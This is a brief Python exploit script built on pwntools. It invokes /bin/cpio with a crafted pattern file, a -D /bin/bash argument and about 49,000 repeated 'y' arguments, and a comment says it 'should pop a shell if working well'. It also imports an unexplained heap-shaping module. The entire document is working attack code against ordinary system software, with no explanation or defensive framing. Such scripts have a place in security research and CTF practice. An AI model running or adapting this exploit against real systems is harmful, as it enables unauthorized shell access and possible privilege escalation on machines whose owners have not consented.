#!/usr/bin/env python3

from pwn import *
import docker_fengshui


PATTERN_FILE = "./patt"
CPIO_BINARY = "/bin/cpio"
BLOCK_SIZE = 16384
NUM_PATTERNS = 0xc200

# call cpio and should pop a shell if working well
cpio_cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} -D /bin/bash" + " y"*NUM_PATTERNS
p = process(cpio_cmd.split())
p.interactive()